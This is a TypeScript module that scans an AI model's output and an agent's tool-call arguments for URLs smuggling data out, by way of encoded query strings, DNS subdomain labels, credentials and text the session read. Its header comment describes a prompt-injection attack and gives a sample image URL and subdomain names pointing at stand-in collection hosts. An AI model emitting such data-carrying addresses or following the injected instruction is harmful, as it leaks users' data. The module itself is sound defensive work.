/**
 * Exfiltration guard: data riding out of a session inside an address.
 *
 * The classic leak from an AI agent needs no tool at all. Content the model read tells it to write
 * `![](https://collect.example/p.png?d=<the user's data>)`, and the chat window that renders the reply fetches
 * the picture, handing the data to collect.example. The same trick works in a link the person clicks, in an
 * HTML <img>, in CSS url(), and in a host name (`<data>.collect.example`: a DNS lookup is enough to deliver it).
 *
 * This module reads addresses for that shape. It is used in two places:
 *   - `outcheck()`: a model's OUTPUT, before it is rendered. Hostile means do not render it: `safeText` is the
 *     reply with the offending addresses taken out. `ingress outcheck` runs it on stdin.
 *   - the action broker (broker.ts): every URL and host in a tool call's arguments, while the run has read
 *     outside content. Shapes found here send the call to a person.
 *
 * What counts as data in an address:
 *   encoded     long base64, base64url or hex runs in the query, fragment, path or subdomain
 *   secret      a credential the redaction pass recognises (secrets.ts), after URL, base64 and hex decoding
 *   content     phrases from text the session read earlier (tool results), matched by fingerprints of
 *               five-word runs, so the text itself never has to be kept
 *   dns         data-shaped subdomain labels: a lookup of the name is the delivery
 *   marker      the session's canary, or a verification code the session read
 *
 * A host the session actually fetched from, or the person named, is treated more gently than one that only
 * appeared in content, or nowhere. Nothing here makes a network request.
 */

import { createHash } from "node:crypto";
import { collectSecrets } from "./secrets.js";

// ---------- fingerprints of what the session read ----------

const SHINGLE = 5;
/** fingerprints kept per source text; a run keeps at most `MAX_RUN_PRINTS` across sources (newest win) */
export const MAX_SOURCE_PRINTS = 3000;
export const MAX_RUN_PRINTS = 8000;

const fp = (s: string) => createHash("sha256").update(s, "utf8").digest("hex").slice(0, 12);
const words = (text: string) => text.toLowerCase().match(/[\p{L}\p{N}]{2,}/gu) ?? [];
/** characters of a token that look like data rather than words: mixed letter cases and digits */
const dataLike = (t: string) => t.length >= 6 && [/[a-z]/, /[A-Z]/, /[0-9]/].filter((r) => r.test(t)).length >= 2;

/**
 * Fingerprints of a text: hashes of every run of five words, plus long data-like tokens (ids, keys) on their
 * own. One-way and short: they say "this phrase was read", never what it was.
 */
export function contentFingerprints(text: string, limit = MAX_SOURCE_PRINTS): string[] {
  const out = new Set<string>();
  const t = text.slice(0, 400_000);
  for (const tok of t.match(/[A-Za-z0-9_\-+/=]{20,200}/g) ?? []) if (dataLike(tok) && out.size < limit) out.add(`t:${fp(tok)}`);
  const w = words(t);
  for (let i = 0; i + SHINGLE <= w.length && out.size < limit; i++) out.add(fp(w.slice(i, i + SHINGLE).join(" ")));
  return [...out];
}

/** How many fingerprints of this outbound text are among those the session read. */
export function contentMatches(text: string, prints: ReadonlySet<string>): number {
  if (!prints.size || !text) return 0;
  let n = 0;
  for (const p of contentFingerprints(text, 2000)) if (prints.has(p)) n++;
  return n;
}

// ---------- decoding what an address carries ----------

const printable = (s: string) => s.length > 0 && [...s].filter((c) => /[\p{L}\p{N}\p{P}\p{Zs}\n\t]/u.test(c)).length / [...s].length >= 0.85;

/** The text an address carries, decoded every way it plausibly could be: percent, base64, base64url, hex, base32 labels. */
export function decodedCarriage(url: string): string[] {
  const out = [url];
  let pct = url;
  try { pct = decodeURIComponent(url.replace(/\+/g, " ")); } catch { /* keep encoded */ }
  if (pct !== url) out.push(pct);
  out.push(pct.replace(/[._~\-/?&=#:]+/g, " "));
  return [...out, ...decodedTokens(url)];
}

/** Only what decoding uncovers: base64, base64url and hex runs, and base32 subdomain labels. */
export function decodedTokens(url: string): string[] {
  const out: string[] = [];
  let pct = url;
  try { pct = decodeURIComponent(url); } catch { /* keep encoded */ }
  for (const tok of pct.match(/[A-Za-z0-9+/_-]{16,4000}={0,2}/g) ?? []) {
    if (/^[0-9a-f]+$/i.test(tok) && tok.length % 2 === 0) {
      const h = Buffer.from(tok, "hex").toString("utf8");
      if (printable(h)) out.push(h);
      continue;
    }
    try {
      const b = Buffer.from(tok.replace(/-/g, "+").replace(/_/g, "/"), "base64").toString("utf8");
      if (b.length >= 8 && printable(b)) out.push(b);
    } catch { /* not base64 */ }
  }
  // base32 subdomain labels (dnscat-style tools use it)
  for (const lab of (hostOfUrl(url) ?? "").split(".")) {
    if (lab.length >= 16 && /^[a-z2-7]+$/i.test(lab)) { const b = base32(lab); if (b && printable(b)) out.push(b); }
  }
  return out;
}

function base32(s: string): string | undefined {
  const A = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
  let bits = 0, val = 0; const bytes: number[] = [];
  for (const c of s.toUpperCase()) { const i = A.indexOf(c); if (i < 0) return undefined; val = (val << 5) | i; bits += 5; if (bits >= 8) { bytes.push((val >>> (bits - 8)) & 255); bits -= 8; } }
  return Buffer.from(bytes).toString("utf8");
}

function entropy(s: string): number {
  const f = new Map<string, number>();
  for (const c of s) f.set(c, (f.get(c) ?? 0) + 1);
  let h = 0;
  for (const n of f.values()) { const p = n / s.length; h -= p * Math.log2(p); }
  return h;
}

export function hostOfUrl(u: string): string | undefined {
  try { return new URL(/^[a-z][a-z0-9+.-]*:\/\//i.test(u) ? u : `http:${u.startsWith("//") ? "" : "//"}${u}`).hostname.toLowerCase().replace(/\.$/, ""); } catch { return undefined; }
}

// ---------- DNS-style exfiltration ----------

/** suffixes under which the registrable name has three labels */
const TWO_PART_SUFFIX = /\.(?:co|com|net|org|gov|ac|edu)\.[a-z]{2}$|\.(?:github|gitlab)\.io$|\.(?:herokuapp|vercel|netlify|pages|workers)\.(?:com|app|dev)$|\.amazonaws\.com$|\.cloudfront\.net$/;

/**
 * Data-shaped labels in a host name, in plain words. A lookup of the name delivers what its labels carry, so a
 * name like `4a6f686e2e646f65.c2.example` needs no request at all. Word-like labels (`docs`, `my-app-git-main`)
 * and short ids are left alone.
 */
export function dnsExfilShapes(host: string): string[] {
  const h = host.toLowerCase().replace(/\.$/, "");
  if (!h.includes(".") || /^[\d.]+$/.test(h) || h.includes(":")) return [];
  const labels = h.split(".");
  const keep = TWO_PART_SUFFIX.test(h) ? 3 : 2;
  const sub = labels.slice(0, Math.max(0, labels.length - keep)).filter((l) => !l.startsWith("xn--"));
  if (!sub.length) return [];
  const why: string[] = [];
  const shaped = sub.filter((l) => {
    const flat = l.replace(/-/g, "");
    if (flat.length >= 32 && /^[0-9a-f]+$/.test(flat)) return true;                                     // hex
    if (flat.length >= 24 && /\d/.test(flat) && /[a-z]/.test(flat) && entropy(flat) >= 3.6 && !l.includes("-")) return true; // base32/base64-ish
    if (l.length >= 52) return true;                                                                     // near the 63-character limit
    return false;
  });
  if (shaped.length) why.push(`the host name ${h.slice(0, 80)} carries data in its subdomain (${shaped.length === 1 ? `a ${shaped[0].length}-character encoded label` : `${shaped.length} encoded labels`}): looking the name up is enough to deliver it`);
  else if (sub.join("").length >= 80 && sub.length >= 3) why.push(`the host name ${h.slice(0, 80)} has ${sub.join("").length} characters of subdomain across ${sub.length} labels, a shape used to carry data in DNS lookups`);
  return why;
}

// ---------- one address ----------

export type ExfilKind = "encoded" | "secret" | "content" | "dns" | "marker";

export interface CarriageContext {
  /** fingerprints of text the session read (contentFingerprints) */
  prints?: ReadonlySet<string>;
  /** the session's canary markers */
  canaries?: readonly string[];
  /** verification codes the session read */
  codes?: readonly string[];
}

/** What an address carries that looks like data leaving, by kind, with plain-words reasons. */
export function urlCarriage(url: string, ctx: CarriageContext = {}): Array<{ kind: ExfilKind; why: string; matches?: number }> {
  const out: Array<{ kind: ExfilKind; why: string; matches?: number }> = [];
  let u: URL;
  try { u = new URL(/^[a-z][a-z0-9+.-]*:\/\//i.test(url) ? url : `https:${url.startsWith("//") ? "" : "//"}${url}`); } catch { return out; }
  const host = u.hostname.toLowerCase().replace(/\.$/, "");
  // encoded runs: lower thresholds where data has no business (query, fragment), higher in the path (content hashes are common there)
  let dq = "", dp = u.pathname;
  try { dq = decodeURIComponent(`${u.search} ${u.hash}`); } catch { dq = `${u.search} ${u.hash}`; }
  try { dp = decodeURIComponent(u.pathname); } catch { /* keep */ }
  const runs = (s: string, hexMin: number, b64Min: number, re = /[A-Za-z0-9+/_-]{16,}={0,2}/g) => (s.match(re) ?? []).filter((t) => {
    const flat = t.replace(/[=]/g, "");
    if (/^[0-9a-f]+$/i.test(flat)) return flat.length >= hexMin;
    return flat.length >= b64Min && dataLike(flat) && entropy(flat) >= 4.0;
  });
  // a path's own slashes separate segments; a segment is read on its own
  const q = runs(dq, 32, 24), p = runs(dp, 64, 40, /[A-Za-z0-9+_-]{16,}={0,2}/g);
  const qChars = q.reduce((n, t) => n + t.length, 0), pChars = p.reduce((n, t) => n + t.length, 0);
  if (qChars) out.push({ kind: "encoded", why: `its query or fragment carries ${qChars} characters of encoded data` });
  if (pChars) out.push({ kind: "encoded", why: `its path carries ${pChars} characters of encoded data` });
  for (const w of dnsExfilShapes(host)) out.push({ kind: "dns", why: w });
  const carried = decodedCarriage(u.href);
  const secrets = collectSecrets(carried);
  if (secrets.length || u.password) out.push({ kind: "secret", why: `it carries ${u.password ? "a password" : `${secrets.length} credential${secrets.length === 1 ? "" : "s"}`}` });
  if (ctx.prints?.size) {
    // read where data rides (query, fragment, encoded runs, the subdomain), not the words of a path, which
    // often repeat a page's own title
    const where = [dq.replace(/[._~\-/?&=#:+]+/g, " "), ...decodedTokens(u.href), host.split(".").slice(0, -2).join(" ")];
    const n = Math.max(0, ...where.map((c) => contentMatches(c, ctx.prints!)));
    if (n > 0) out.push({ kind: "content", why: `it carries text from content this session read earlier (${n} matching phrase${n === 1 ? "" : "s"})`, matches: n });
  }
  const flat = carried.join("\n");
  if (ctx.canaries?.some((c) => c && flat.includes(c))) out.push({ kind: "marker", why: "it carries the session's marker: the conversation itself is leaving" });
  const code = ctx.codes?.find((c) => c.length >= 6 && new RegExp(`(?<![A-Za-z0-9])${c}(?![A-Za-z0-9])`).test(flat));
  if (code) out.push({ kind: "marker", why: `it carries a verification code the session read (ending ${code.slice(-2)})` });
  return out;
}

// ---------- model output ----------

export type OutputElement = "image" | "link" | "html-autoload" | "html-link" | "css" | "reference" | "bare-url";

export interface OutcheckOptions extends CarriageContext {
  /** hosts the session actually fetched from, or the person named. Undefined: no session is known, so no host is */
  visitedHosts?: readonly string[];
  /** hosts any address may point at without a finding (a leading dot covers subdomains) */
  allowHosts?: readonly string[];
  /** earlier tool results, when the caller has them as text rather than fingerprints */
  priorText?: readonly string[];
}

export interface OutcheckFinding {
  severity: "high" | "review";
  element: OutputElement;
  /** whether a renderer fetches it without a click (an image, an iframe, CSS) */
  autoLoads: boolean;
  host: string;
  /** shortened, with credentials redacted */
  url: string;
  visited: boolean;
  reasons: string[];
}

export interface OutcheckResult {
  tier: "clean" | "suspect" | "hostile";
  findings: OutcheckFinding[];
  /** the text with every high-severity address taken out (image and HTML elements removed, links reduced to their text) */
  safeText: string;
  /** addresses read */
  checked: number;
}

interface Found { url: string; element: OutputElement; autoLoads: boolean; start: number; end: number; replacement: string }

const AUTOLOAD_TAGS = new Set(["img", "image", "iframe", "frame", "script", "embed", "object", "source", "video", "audio", "track", "input", "link", "picture", "svg", "use", "body", "table", "td", "meta"]);
const NETWORK = /^(?:https?:|wss?:|ftp:|\/\/)/i;

/** Every address in a model's output that a renderer could fetch or the person could follow. */
export function outputAddresses(text: string): Found[] {
  const t = text.slice(0, 2_000_000);
  const found: Found[] = [];
  const covered: Array<[number, number]> = [];
  const isCovered = (i: number) => covered.some(([a, b]) => i >= a && i < b);
  const add = (f: Found) => { if (NETWORK.test(f.url)) found.push(f); covered.push([f.start, f.end]); };
  // reference definitions, and which labels are used as images
  const imageRefs = new Set([...t.matchAll(/!\[[^\]]{0,1000}\]\[([^\]]{1,200})\]/g)].map((m) => m[1].toLowerCase()));
  for (const m of t.matchAll(/^ {0,3}\[([^\]]{1,200})\]:[ \t]*<?([^\s>]+)>?/gm)) add({ url: m[2], element: "reference", autoLoads: imageRefs.has(m[1].toLowerCase()), start: m.index!, end: m.index! + m[0].length, replacement: "" });
  // markdown images, then links
  for (const m of t.matchAll(/!\[([^\]]{0,1000})\]\(\s*<?([^)\s>]+)>?(?:\s+(?:"[^"]*"|'[^']*'|\([^)]*\)))?\s*\)/g)) if (!isCovered(m.index!)) add({ url: m[2], element: "image", autoLoads: true, start: m.index!, end: m.index! + m[0].length, replacement: `[image removed by AcePaste Ingress${m[1] ? `: ${m[1].slice(0, 80)}` : ""}]` });
  for (const m of t.matchAll(/\[([^\]]{0,1000})\]\(\s*<?([^)\s>]+)>?(?:\s+(?:"[^"]*"|'[^']*'|\([^)]*\)))?\s*\)/g)) if (!isCovered(m.index!)) add({ url: m[2], element: "link", autoLoads: false, start: m.index!, end: m.index! + m[0].length, replacement: `${m[1]} [link removed by AcePaste Ingress]` });
  // HTML tags: every address-bearing attribute
  for (const m of t.matchAll(/<([a-z][a-z0-9-]*)\b([^<>]{0,4000})>/gi)) {
    if (isCovered(m.index!)) continue;
    const tag = m[1].toLowerCase();
    let any = false;
    for (const a of m[2].matchAll(/\s([a-z:-]+)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'>]+))/gi)) {
      const attr = a[1].toLowerCase(), val = (a[2] ?? a[3] ?? a[4] ?? "").trim();
      const urls = attr === "srcset" ? val.split(",").map((s) => s.trim().split(/\s+/)[0]) : attr === "style" ? [...val.matchAll(/url\(\s*['"]?([^'")\s]+)/gi)].map((x) => x[1]) : ["src", "href", "data", "poster", "background", "action", "formaction", "xlink:href", "content", "lowsrc", "dynsrc", "ping"].includes(attr) ? [val] : [];
      for (const url of urls) {
        if (!NETWORK.test(url)) continue;
        any = true;
        const auto = attr === "style" || attr === "background" || attr === "poster" || (AUTOLOAD_TAGS.has(tag) && attr !== "href") || (tag === "link" && attr === "href") || attr === "ping";
        found.push({ url, element: auto ? "html-autoload" : "html-link", autoLoads: auto, start: m.index!, end: m.index! + m[0].length, replacement: auto ? "[element removed by AcePaste Ingress]" : (tag === "a" ? "<a>" : "") });
      }
    }
    if (any) covered.push([m.index!, m.index! + m[0].length]);
  }
  // CSS outside tags (a <style> block)
  for (const m of t.matchAll(/url\(\s*['"]?((?:https?:)?\/\/[^'")\s]+)['"]?\s*\)/gi)) if (!isCovered(m.index!)) add({ url: m[1], element: "css", autoLoads: true, start: m.index!, end: m.index! + m[0].length, replacement: "url()" });
  // bare addresses many renderers turn into links
  for (const m of t.matchAll(/<?((?:https?|ftp|wss?):\/\/[^\s<>"'`)\]]+)>?/gi)) if (!isCovered(m.index!)) add({ url: m[1].replace(/[.,;:!?]+$/, ""), element: "bare-url", autoLoads: false, start: m.index!, end: m.index! + m[0].length, replacement: "[address removed by AcePaste Ingress]" });
  return found;
}

const allowed = (host: string, allow: readonly string[] = []) => allow.some((a) => { const x = a.toLowerCase().replace(/\.$/, ""); return x.startsWith(".") ? host === x.slice(1) || host.endsWith(x) : host === x; });
const within = (host: string, list: readonly string[]) => list.some((v) => { const x = v.toLowerCase(); return host === x || host.endsWith(`.${x}`); });

function shortUrl(url: string): string {
  let s = url;
  for (const k of collectSecrets([url])) s = s.split(k).join("[redacted]");
  return s.length > 140 ? `${s.slice(0, 100)}…(${s.length - 100} more)` : s;
}

/**
 * Read a model's output for data leaving through addresses, before it is rendered.
 *
 *   high (hostile)   a secret, the session's marker or a verification code in any address; a run of text the session
 *                    read earlier (seven words or more) in an address to a host it never visited; encoded data or a data-carrying host name
 *                    in anything a renderer fetches by itself (an image, an iframe, CSS) to a host it never visited
 *   review (suspect) the same shapes in a link the person would have to click, or toward a host the session visited
 */
export function outcheck(text: string, o: OutcheckOptions = {}): OutcheckResult {
  const prints = new Set(o.prints ?? []);
  for (const p of o.priorText ?? []) for (const f of contentFingerprints(p)) prints.add(f);
  const ctx: CarriageContext = { prints, canaries: o.canaries, codes: o.codes };
  const addrs = outputAddresses(text);
  const findings: OutcheckFinding[] = [];
  const remove: Found[] = [];
  for (const a of addrs) {
    const host = hostOfUrl(a.url);
    if (!host || allowed(host, o.allowHosts)) continue;
    const carried = urlCarriage(a.url, ctx);
    if (!carried.length) continue;
    const visited = o.visitedHosts ? within(host, o.visitedHosts) : false;
    const kinds = new Set(carried.map((c) => c.kind));
    const high = kinds.has("secret") || kinds.has("marker")
      || (!visited && carried.some((c) => c.kind === "content" && (c.matches ?? 0) >= 3))
      || (a.autoLoads && !visited && (kinds.has("encoded") || kinds.has("dns")));
    const reasons = carried.map((c) => c.why);
    if (!visited) reasons.push(o.visitedHosts ? `${host} is not a host this session fetched from or the person named` : `no session is known, so ${host} is treated as never visited`);
    if (a.autoLoads) reasons.push("a renderer fetches it without a click");
    findings.push({ severity: high ? "high" : "review", element: a.element, autoLoads: a.autoLoads, host, url: shortUrl(a.url), visited, reasons });
    if (high) remove.push(a);
  }
  // take out what is high, from the end so positions stay valid; one tag may hold several addresses
  let safe = text;
  const spans = [...new Map(remove.map((r) => [`${r.start}:${r.end}`, r])).values()].sort((x, y) => y.start - x.start);
  for (const r of spans) safe = safe.slice(0, r.start) + r.replacement + safe.slice(r.end);
  const tier = findings.some((f) => f.severity === "high") ? "hostile" : findings.length ? "suspect" : "clean";
  return { tier, findings, safeText: safe, checked: addrs.length };
}

/** the human report */
export function formatOutcheck(r: OutcheckResult): string {
  const out = [`outcheck: ${r.tier} (${r.checked} address${r.checked === 1 ? "" : "es"} read, ${r.findings.length} flagged)`];
  for (const f of r.findings) {
    out.push(`  ${f.severity.toUpperCase().padEnd(6)} ${f.element}${f.autoLoads ? " (loads by itself)" : ""} -> ${f.host}`);
    out.push(`         ${f.url}`);
    for (const why of f.reasons) out.push(`         - ${why}`);
  }
  if (r.tier === "hostile") out.push("", "Do not render this reply as it is. The text with those addresses taken out is in safeText (--json) or printed by --safe.");
  return out.join("\n");
}

/**
 * Hosts a tool call would deliver data to, read from where a destination is written: URLs in a shell command,
 * and the fields of other tools that name a recipient or an endpoint (to, cc, url, webhook...). Hosts that are
 * only mentioned in a message body are not destinations.
 */
export function egressTargets(tool: string, args: unknown): string[] {
  const out = new Set<string>();
  const urlHosts = (s: string) => { for (const m of s.slice(0, 200_000).matchAll(/\b(?:https?|wss?|ftp):\/\/[^\s"'<>()]+/gi)) { const h = hostOfUrl(m[0]); if (h) out.add(h); } };
  const DEST = /^(?:to|cc|bcc|recipients?|email|emails|address|addresses|url|uri|href|endpoint|host|hostname|webhook|webhook_?url|target|destination|server|callback(?:_?url)?)$/i;
  const walk = (x: unknown, key: string | undefined, depth: number) => {
    if (depth > 12) return;
    if (typeof x === "string") {
      if (tool === "shell__run" || /url|uri|href|endpoint|webhook|callback/i.test(key ?? "")) urlHosts(x);
      if (key && DEST.test(key)) {
        for (const m of x.matchAll(/[\w.+-]{1,64}@((?:[a-z0-9-]+\.)+[a-z]{2,24})/gi)) out.add(m[1].toLowerCase());
        urlHosts(x);
        if (/^[a-z0-9.-]+\.[a-z]{2,24}$/i.test(x.trim())) out.add(x.trim().toLowerCase());
      }
    } else if (Array.isArray(x)) for (const y of x) walk(y, key, depth + 1);
    else if (x && typeof x === "object") for (const [k, y] of Object.entries(x as Record<string, unknown>)) walk(y, k, depth + 1);
  };
  walk(args, undefined, 0);
  return [...out].filter((h) => !/^(?:localhost|127(?:\.\d{1,3}){3}|::1|0\.0\.0\.0)$/.test(h));
}
